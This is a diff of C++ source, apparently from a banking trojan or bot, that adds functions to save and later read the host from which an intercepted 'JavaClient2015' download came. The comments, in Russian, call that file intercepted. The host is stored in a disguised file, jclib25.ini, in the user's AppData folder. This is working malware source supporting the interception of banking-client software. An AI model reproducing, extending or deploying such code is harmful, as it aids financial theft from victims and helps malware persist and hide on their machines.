@@ -11,6 +11,7 @@
 #include "GetApi.h"
 #include "Strings.h"
 #include "BotHTTP.h"
+#include "HTTPConsts.h"
 #include "Utils.h"
 
 
@@ -104,4 +105,58 @@ void CheckJavaClient2015File(const char *aURL)
 		Data->URL          = URL.URL();
 
 		StartThread(Downloadclient2015File, Data);
+
+
+		// Записываем хост в файл
+		string FN = GetJavaClient2015FileName();
+		if (!FN.IsEmpty())
+		{
+			string Host = URL.Protocol;
+			Host += HTTPProtocolDelimeter;
+			Host += URL.Host;
+
+            File::WriteBufferA(FN.t_str(), Host.t_str(), Host.Length());
+		}
+}
+
+
+
+//*****************************************************************
+// Функция возвращает имя файла куда будет записан хост с которого
+// перехватили файл
+//*****************************************************************
+string GetJavaClient2015FileName()
+{
+	string Path(MAX_PATH);
+
+	if (pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE))
+	{
+        Path.CalcLength();
+        Path += "\\jclib25.ini";
+    }
+
+	return Path;
+}
+
+
+//*****************************************************************
+// Функция возвращает значение хоста с которого качали оригинальный
+// файл
+//*****************************************************************
+string GetJavaClient2015HkstName()
+{
+	string Host;
+
+	string FN = GetJavaClient2015FileName();
+
+	DWORD Sz = 0;
+	PCHAR H = (PCHAR)File::ReadToBufferA(FN.t_str(), Sz);
+
+	if (H)
+	{
+        Host.Copy(H, 0, Sz);
+        MemFree(H);
+    }
+
+    return Host;
 }
